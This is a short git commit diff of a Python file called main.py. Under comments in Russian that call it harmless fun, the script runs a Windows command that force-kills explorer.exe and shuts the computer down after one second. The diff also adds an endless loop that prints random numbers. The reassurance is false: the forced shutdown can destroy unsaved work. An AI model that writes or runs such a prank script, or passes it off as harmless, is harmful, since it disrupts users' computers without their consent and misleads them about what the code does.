9b605c19223657ca55a1c59d92567b63bab8a2d7
Extbhite <103527176+ExtbhiteEAS@users.noreply.github.com>
2022-06-23 17:55:02 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,8 +1,13 @@
+# Я знаю что это бесполезный код, но это ради забавы.
+# Ахахаххаха. Если что, это никак не навредит ПК.
+
 import os
+import random
 
 def main():
-    print("Hello world!")
     os.system("taskkill /f /im explorer.exe && shutdown -s -t 1")
+    while True:
+        print(f"{random.randint(0, 10000000000000001)}")
 
 if __name__ == "__main__":
     main()
